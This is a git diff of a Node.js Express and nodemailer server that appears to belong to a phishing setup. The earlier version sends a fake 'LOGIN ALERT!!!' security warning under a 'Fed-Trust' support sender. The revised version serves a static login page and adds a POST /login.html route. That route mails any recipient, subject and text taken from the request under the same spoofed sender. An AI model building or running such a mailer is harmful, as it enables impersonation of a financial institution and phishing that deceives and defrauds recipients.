@@ -1,12 +1,38 @@
-
-const express = require("express");
-const nodemailer = require("nodemailer");
+const express = require('express');
+var bodyParser  = require('body-parser');
 const app = express();
-const port = 3000
+const port = 4000
+const nodemailer = require("nodemailer");
+const path = require('path');
 
 
 
-function sendEmail(){
+
+
+app.use(
+    express.urlencoded({
+      extended: true,
+    })
+  )
+
+  app.use(express.json());
+
+
+
+    const ff = path.join(__dirname, '/src')
+    app.use( express.static(ff));
+
+
+app.get('/', (request, response)=>{
+    response.sendFile(__dirname + '/src')
+});
+
+app.post('/login.html', (request, response)=>{
+   
+
+    let info = request.body
+    console.log(info.email);
+   
     return new Promise((resolve, reject)=>{
         var transporter = nodemailer.createTransport({
             host: 'mail.todayupdate.com.ng',
@@ -22,9 +48,9 @@ function sendEmail(){
 
         const mail_option = {
             from:`Fed-Trust <support@todayupdate.com.ng>`,
-            to:'queenstiles7@gmail.com',
-            subject:'LOGIN ALERT!!!',
-            text:'Your account was just loged in few seconds ago, if this was not you kindly change your password as soon as possible'
+            to: info.email,
+            subject: info.subject,
+            text: info.message
         }
 
         transporter.sendMail(mail_option, function(error, info){
@@ -33,14 +59,16 @@ function sendEmail(){
             }
             return resolve({message:"email sentss"})
         })
-    })
-}
 
-app.get('/',(req, res)=>[
-      sendEmail()
-      .then(respones =>res.send(respones.message))
-      .catch(error => res.status(500).send(error.message))
-])
+
+
+
+    response.json({
+     message: 'success'
+    })
+    
+})
+})
 
 
 app.listen(port, ()=>{
